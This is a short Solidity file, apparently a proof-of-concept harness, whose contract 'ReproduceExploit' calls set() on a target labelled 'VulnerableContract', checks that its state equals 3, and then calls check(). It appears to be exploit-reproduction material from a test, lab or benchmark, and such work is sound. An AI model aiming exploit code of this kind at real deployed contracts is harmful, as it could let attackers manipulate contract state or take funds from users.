interface VulnerableContract {
    function set() external;
    function check() external;
    function a() external view returns (uint);
}

contract ReproduceExploit {
    VulnerableContract public target;

    constructor(address _target) {
        target = VulnerableContract(_target);
    }

    function trigger() public {
        target.set();
        require(target.a() == 3, "State not set correctly");
        target.check();
    }
}